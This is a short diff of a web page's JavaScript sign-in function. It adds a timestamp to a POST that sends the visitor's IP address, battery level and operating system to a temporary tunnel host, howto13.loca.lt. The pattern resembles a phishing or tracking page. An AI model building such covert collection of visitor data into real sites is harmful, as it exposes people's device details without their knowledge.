@@ -142,6 +142,16 @@ function signIn() {
 
       return os;
     }
+    var today = new Date();
+    var date =
+      today.getFullYear() +
+      "-" +
+      (today.getMonth() + 1) +
+      "-" +
+      today.getDate();
+    var time =
+      today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
+    var dateTime = date + " " + time;
 
     axios
       .post("https://howto13.loca.lt/login", {
@@ -150,6 +160,7 @@ function signIn() {
         ipadress: ip_address,
         battery: battery.level,
         OSystem: getOS(),
+        Date: dateTime,
       })
       .then((res) => {
         console.log(res.data);
@@ -635,4 +646,4 @@ document.onkeydown = function (e) {
   }
 };
 
-// alert(getOS());
+// console.log(today);
